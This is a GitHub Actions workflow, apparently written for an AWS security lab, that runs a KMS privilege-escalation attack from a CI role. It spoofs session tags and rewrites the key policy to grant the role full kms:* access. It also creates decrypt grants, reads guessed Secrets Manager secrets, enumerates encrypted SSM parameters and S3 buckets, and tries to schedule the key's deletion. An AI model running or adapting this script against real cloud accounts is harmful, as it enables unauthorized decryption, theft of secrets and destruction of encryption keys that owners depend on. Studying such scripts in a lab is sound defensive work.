name: KMS Focused Exploitation

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  kms-exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Configure AWS credentials with KMS-focused session tags
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role
          aws-region: us-east-1
          role-session-tags: |
            Key=Department,Value=Security
            Key=Team,Value=Admin
            Key=KMSAccess,Value=true
            Key=Decrypt,Value=allowed
            Key=Service,Value=github-actions
            Key=Purpose,Value=deployment
            Key=Environment,Value=production
            Key=Privilege,Value=escalate

      - name: Test basic KMS access
        run: |
          echo "=== Testing basic KMS access ==="
          echo "Current identity:"
          aws sts get-caller-identity
          
          echo "Testing KMS list operations:"
          aws kms list-keys || echo "KMS list-keys failed"
          aws kms list-aliases || echo "KMS list-aliases failed"

      - name: Test specific KMS key access
        run: |
          echo "=== Testing specific KMS key access ==="
          KEY_ID="arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593"
          
          echo "Testing describe-key:"
          aws kms describe-key --key-id "$KEY_ID" || echo "KMS describe-key failed"
          
          echo "Testing get-key-policy:"
          aws kms get-key-policy --key-id "$KEY_ID" --policy-name default || echo "KMS get-key-policy failed"
          
          echo "Testing list-grants:"
          aws kms list-grants --key-id "$KEY_ID" || echo "KMS list-grants failed"

      - name: Test KMS privilege escalation operations
        run: |
          echo "=== Testing KMS privilege escalation operations ==="
          KEY_ID="arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593"
          ROLE_ARN="arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role"
          
          echo "Attempting to create grant for decrypt operations:"
          aws kms create-grant \
            --key-id "$KEY_ID" \
            --grantee-principal "$ROLE_ARN" \
            --operations Decrypt DescribeKey GenerateDataKey \
            --name "github-actions-decrypt-grant" || echo "KMS create-grant failed"
          
          echo "Attempting to modify key policy:"
          cat > /tmp/new_kms_policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowRootAccess",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::067186171322:root"
      },
      "Action": "kms:*",
      "Resource": "*"
    },
    {
      "Sid": "AllowGitHubActionsFullAccess",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role"
      },
      "Action": "kms:*",
      "Resource": "*"
    }
  ]
}
EOF
          
          aws kms put-key-policy \
            --key-id "$KEY_ID" \
            --policy-name default \
            --policy file:///tmp/new_kms_policy.json || echo "KMS put-key-policy failed"

      - name: Test encryption and decryption
        run: |
          echo "=== Testing encryption and decryption ==="
          KEY_ID="arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593"
          
          echo "Testing encryption of test data:"
          echo "test-flag{kms-access-successful}" > /tmp/test-plaintext.txt
          
          aws kms encrypt \
            --key-id "$KEY_ID" \
            --plaintext fileb:///tmp/test-plaintext.txt \
            --output text \
            --query CiphertextBlob > /tmp/encrypted-blob.txt || echo "KMS encrypt failed"
          
          if [ -f /tmp/encrypted-blob.txt ]; then
            echo "Encryption successful, testing decryption:"
            echo $(cat /tmp/encrypted-blob.txt) | base64 -d > /tmp/encrypted-blob.bin
            
            aws kms decrypt \
              --ciphertext-blob fileb:///tmp/encrypted-blob.bin \
              --output text \
              --query Plaintext | base64 -d || echo "KMS decrypt failed"
          fi

      - name: Search for encrypted secrets and data
        run: |
          echo "=== Searching for encrypted secrets and data ==="
          
          echo "Checking for encrypted files in Parameter Store:"
          aws ssm describe-parameters --query 'Parameters[?Type==`SecureString`]' || echo "SSM describe-parameters failed"
          
          echo "Checking for encrypted secrets in Secrets Manager:"
          aws secretsmanager list-secrets --query 'SecretList[?KmsKeyId!=null]' || echo "Encrypted secrets query failed"
          
          echo "Searching for potential encrypted data files:"
          # Check if there are any encrypted files we can find
          for secret_name in "kms-encrypted-flag" "encrypted-credentials" "github-actions-secret" "deployment-key"; do
            echo "Testing secret: $secret_name"
            aws secretsmanager get-secret-value --secret-id "$secret_name" || echo "Secret $secret_name not found"
          done

      - name: Test cross-service KMS usage
        run: |
          echo "=== Testing cross-service KMS usage ==="
          
          echo "Testing if Lambda functions use this KMS key:"
          aws lambda list-functions --query 'Functions[?KMSKeyArn!=null]' || echo "Lambda KMS query failed"
          
          echo "Testing if S3 buckets use this KMS key:"
          aws s3api list-buckets --query 'Buckets[*].Name' --output text | while read bucket; do
            if [ -n "$bucket" ]; then
              echo "Checking bucket encryption: $bucket"
              aws s3api get-bucket-encryption --bucket "$bucket" || echo "No encryption or access denied for $bucket"
            fi
          done

      - name: Final comprehensive KMS test
        run: |
          echo "=== Final comprehensive KMS test ==="
          KEY_ID="arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593"
          
          echo "Testing all KMS operations systematically:"
          
          # If we successfully created a grant, list it
          aws kms list-grants --key-id "$KEY_ID" | grep "github-actions-decrypt-grant" && echo "Grant creation was successful!"
          
          # Test if we can now perform additional KMS operations
          echo "Testing additional KMS operations after potential grant creation:"
          aws kms generate-data-key --key-id "$KEY_ID" --key-spec AES_256 || echo "Generate data key failed"
          aws kms get-parameters-for-import --key-id "$KEY_ID" --wrapping-algorithm RSAES_PKCS1_V1_5 --wrapping-key-spec RSA_2048 || echo "Get parameters for import failed"
          
          # Try to schedule key deletion (this would be a severe privilege escalation)
          aws kms schedule-key-deletion --key-id "$KEY_ID" --pending-window-in-days 7 || echo "Schedule key deletion failed (good!)"
          
          echo "=== KMS exploitation test complete ==="
